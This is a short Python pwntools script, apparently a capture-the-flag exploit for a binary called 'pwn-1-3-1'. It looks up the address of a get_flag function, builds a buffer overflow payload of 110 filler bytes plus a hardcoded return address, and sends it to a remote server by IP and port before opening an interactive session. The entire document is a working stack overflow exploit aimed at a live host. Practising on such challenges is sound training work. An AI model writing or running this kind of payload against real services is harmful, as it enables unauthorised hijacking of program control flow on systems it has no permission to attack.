from pwn import *

e = ELF('./pwn-1-3-1')

print(hex(e.address))

main_address = e.symbols['main']
flag_address = e.symbols['get_flag']
print(hex(main_address), hex(flag_address))
print(e.symbols['main'] - e.symbols['get_flag'])

get_flag_address = 0x08400728

# c = process('./pwn-1-3-1')
c = remote("47.94.239.235", 4005)
dat = flat(['a' * 110, p32(get_flag_address)])
print(dat)
c.sendline(dat)
c.interactive()
